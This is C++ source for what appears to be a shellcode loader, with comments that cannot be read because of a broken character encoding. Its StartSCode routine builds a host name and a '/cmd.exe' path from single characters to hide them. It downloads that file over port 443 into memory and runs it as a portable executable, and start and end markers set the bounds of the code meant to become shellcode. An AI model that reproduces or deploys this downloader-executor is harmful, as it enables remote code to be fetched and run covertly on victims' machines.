#include "ShellCode.h"

//������ʼ��������ת����ں���
#ifdef _WIN64
VOID  mmLoaderSCStart(){
	Strat();
#else
VOID _declspec(naked) mmLoaderSCStart()
{

	__asm	jmp Strat;
#endif
}




//����ҪתΪshellcode�����д�������������
class RmExecute
{
public:
	// ����
#include"Tool.h"

public:
	//ģ��ȫ�ֱ���---�����Ƕ���Ŀȫ�ֱ����Ķ���


	Functions fn;
	char s_runexe[260];
	char* newbuff;


public:
	//����ȫ�ֱ�����ʼ���Լ�һЩ��ʼ�Ĳ���
	RmExecute()
	{
		
		newbuff = NULL;
		Initfunctions(&fn);
		char runexe[] = { 'A', 'A','\0' };
		fn.fnmemcpy(s_runexe, runexe, 260);
	};



	
	~RmExecute()
	{
	};

	
public:
	

	//��ȡ��Ŀ��main�ļ���StartSCode�൱����Ŀ��main����
	void __stdcall StartSCode()
	{
		
		
		wchar_t host[] = {'9','b','i','e','.','o','r','g' ,'\0' };
		wchar_t path[] = { '/','c','m','d','.','e','x','e','\0' };
		
		
		//ʹ��API֮ǰһ��Ҫ������������ַ��ʧ
		Initfunctions(&fn);

		int size = HttpDownload(host, path, 443, TRUE);

		fn.fnMessageBoxA(NULL, newbuff, NULL, MB_OK);
	
		RunPortableExecutable();

		fn.fnfree(newbuff);
		// ����HttpDownloadһ��Ҫfree
	}

	

};

//sehllcode��ں���
void __stdcall Strat()
{
	//������Ҫģ��ȫ�ֱ���������ʹ���������
	RmExecute runclass;
	
	runclass.StartSCode();
}
#ifdef _WIN64
void  mmLoaderSCEnd()
{
	
#else
void __declspec(naked) mmLoaderSCEnd()
{

	__asm int 3;
#endif
}